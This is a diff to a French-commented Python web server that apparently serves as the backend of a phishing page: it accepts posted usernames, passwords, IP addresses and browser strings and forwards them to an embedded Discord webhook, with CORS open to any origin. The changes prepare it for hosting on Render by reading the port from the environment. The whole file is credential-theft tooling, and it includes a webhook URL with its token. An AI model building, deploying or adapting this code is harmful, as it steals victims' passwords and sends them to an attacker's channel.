@@ -2,13 +2,13 @@ from http.server import HTTPServer, SimpleHTTPRequestHandler
 import json
 import datetime
 import urllib.request
+import os
 
 # Remplace par ton URL de webhook Discord valide
 WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHwEPoE4F_MQRmA-6v6-BC5hWbmBc2mmWK"
 
 class MyHandler(SimpleHTTPRequestHandler):
     def end_headers(self):
-        # Ajout des en-têtes CORS pour autoriser les requêtes du site web
         self.send_header('Access-Control-Allow-Origin', '*')
         self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
         self.send_header('Access-Control-Allow-Headers', 'Content-Type')
@@ -32,15 +32,14 @@ class MyHandler(SimpleHTTPRequestHandler):
                 ip_addr = data.get('ip', 'Non spécifiée')
                 user_agent = data.get('userAgent', 'Non spécifié')
 
-                print(f"[+] Données reçues - Utilisateur: {username}")
+                print(f"[+] Données reçues en ligne - Utilisateur: {username}")
 
-                # Construction du message pour Discord
                 msg = (
-                    f"🚨 **NOUVELLE CONNEXION** [{now}] 🚨\n"
+                    f"🚨 **NOUVELLE CONNEXION EN LIGNE (RENDER)** [{now}] 🚨\n"
                     f"👤 **Utilisateur :** {username}\n"
                     f"🔑 **Mot de passe :** {password}\n"
                     f"🌐 **Adresse IP :** {ip_addr}\n"
-                    f"💻 **User-Agent :** {user_agent}"
+                    f"💻 **Navigateur :** {user_agent}"
                 )
 
                 payload = json.dumps({"content": msg}).encode('utf-8')
@@ -66,7 +65,9 @@ class MyHandler(SimpleHTTPRequestHandler):
             self.send_error(404, "Page non trouvée")
 
 if __name__ == '__main__':
-    server_address = ('', 8000)
+    # Récupération automatique du port attribué par Render (ou 10000 par défaut)
+    port = int(os.environ.get("PORT", 10000))
+    server_address = ('', port)
     httpd = HTTPServer(server_address, MyHandler)
-    print("Serveur Python démarré sur le port 8000...")
+    print(f"Serveur web démarré sur le port {port}...")
     httpd.serve_forever()
